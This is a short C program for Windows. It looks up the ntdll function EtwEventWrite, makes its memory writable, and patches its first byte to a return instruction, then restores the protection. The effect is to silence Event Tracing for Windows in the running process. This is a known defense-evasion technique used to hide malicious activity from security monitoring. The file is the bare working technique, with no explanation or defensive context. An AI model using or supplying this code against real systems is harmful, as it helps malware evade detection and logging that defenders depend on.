#include <Windows.h>
#include <stdio.h>

int main() {
	// returning 'ret' for x64
	UCHAR _patchBytes[] = { 0xc3, 0x00, 0x00, 0x00 };
	DWORD op, t;
	void* eventWrite = (void*)GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");

	if (eventWrite) {
		// set memory protection for write access
		if (VirtualProtect(eventWrite, 4, PAGE_READWRITE, &op)) {
			SIZE_T pSize = sizeof(_patchBytes);
			if (WriteProcessMemory(-1, eventWrite, _patchBytes, 4, NULL)) {
				// restore the memory back to original protection
				if (VirtualProtect(eventWrite, 4, op, &t)) {
					printf("Hit <Enter> to exit...\n");
					getchar();
					return TRUE;
				}
			}
		}
	}
	printf("Error...\n");
	return FALSE;
}

